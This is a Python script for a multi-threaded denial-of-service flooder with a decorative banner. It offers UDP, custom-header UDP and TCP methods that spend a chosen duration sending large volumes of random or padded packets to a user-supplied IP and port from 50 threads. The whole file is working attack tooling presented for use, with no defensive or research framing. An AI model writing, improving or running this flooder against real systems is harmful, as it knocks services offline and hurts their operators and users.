import threading, fade, random, socket, os, sys, time, struct, signal
from colorama import init, Fore
from concurrent.futures import ThreadPoolExecutor

def signal_handler(sig, frame):
    os.system('clear')
    sys.exit(0)

signal.signal(signal.SIGINT, signal_handler)
stop_event = threading.Event()

init(autoreset=True)

def udp(ip, port):
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    while not stop_event.is_set():
        try:
            sock.sendto(random._urandom(65507), (ip, port))
        except socket.error as e:
            print(f" [{Fore.MAGENTA}!{Fore.RESET}] socket error: {e}               \n", end='\r')

def cudp(ip, port):
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    while not stop_event.is_set():
        try:
            data = bytes(range(256)) * 212
            payload = build_cudp(7, data)

            sock.sendto(payload, (ip, port))
        except socket.error as e:
            print(f" [{Fore.MAGENTA}!{Fore.RESET}] socket error: {e}               \n", end='\r')

def tcp(ip, port):
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        sock.connect((ip, port))
        while not stop_event.is_set():
            sock.send(random._urandom(4096))
    except Exception as e:
        print(f" [{Fore.MAGENTA}!{Fore.RESET}] tcp error: {e}               \n", end='\r')

def build_cudp(msg_type, data: bytes):
    magic = 0xC1
    version = 0x01
    flags = 0x00
    length = len(data)

    header = struct.pack("!BBBBH",
        magic,
        version,
        msg_type,
        flags,
        length
    )

    return header + data

def parse_custom_command(methods):
    print(f'  [{Fore.MAGENTA}~{Fore.RESET}] usage: <method> <ip> <duration> <port>')
    raw = input(f"  [{Fore.MAGENTA}?{Fore.RESET}] -> ").strip()

    parts = raw.split()
    if len(parts) != 4:
        print(f"  [{Fore.MAGENTA}!{Fore.RESET}] invalid command format\n")
        return None

    method = parts[0].lower()
    if method not in methods:
        print(f"  [{Fore.MAGENTA}!{Fore.RESET}] unknown method: {method}\n")
        return None

    try:
        ip = parts[1]
        duration = int(parts[2])
        port = int(parts[3])

        socket.inet_aton(ip)
        if not 0 <= port <= 65535:
            print(f"  [{Fore.MAGENTA}!{Fore.RESET}] error: port must be between 0–65535\n")
            return None

        return method, ip, port, duration

    except Exception as e:
        print(f"  [{Fore.MAGENTA}!{Fore.RESET}] error parsing command: {e}\n")
        return None

def main():
    os.system('cls' if os.name == 'nt' else 'clear')

    banner = '''
     ._________________.
     |.---------------.|   
     ||   -._ .-.     ||    methods: udp, cudp, tcp
     ||   -._| | |    ||    built by: 64bz
     ||   -._|"|"|    ||    
     ||   -._|.-.|    ||
     ||_______________||    
     /.-.-.-.-.-.-.-.-.\\ 
    /.-.-.-.-.-.-.-.-.-.\\   
   /.-.-.-.-.-.-.-.-.-.-.\\
  /______/__________\\___o_\\ 
  \\_______________________/
    '''

    while True:

        methods = {
        "udp": udp,
        "cudp": cudp,
        "tcp": tcp
        }

        print(fade.pinkred(banner))
        result = parse_custom_command(methods)

        if result is None:
            time.sleep(0.5)
            os.system('cls' if os.name == 'nt' else 'clear')
            continue

        method, ip, port, duration = result
        attack_function = methods[method]

        print(f"\n  [{Fore.LIGHTMAGENTA_EX}~{Fore.RESET}] attack started using {method.upper()}...")

        MAX_WORKERS = 50

        with ThreadPoolExecutor(max_workers=MAX_WORKERS) as executor:
            try:
                for _ in range(MAX_WORKERS):
                    executor.submit(attack_function, ip, port)

                time.sleep(duration)
                stop_event.set()

            except Exception as e:
                print(f"\n  [{Fore.MAGENTA}!{Fore.RESET}] thread error: {e}\n")

        print(f"  [{Fore.LIGHTMAGENTA_EX}~{Fore.RESET}] attack stopped...             ")
        input("")
        os.system('cls' if os.name == 'nt' else 'clear')

if __name__ == "__main__":
    main()
    os.system('clear')
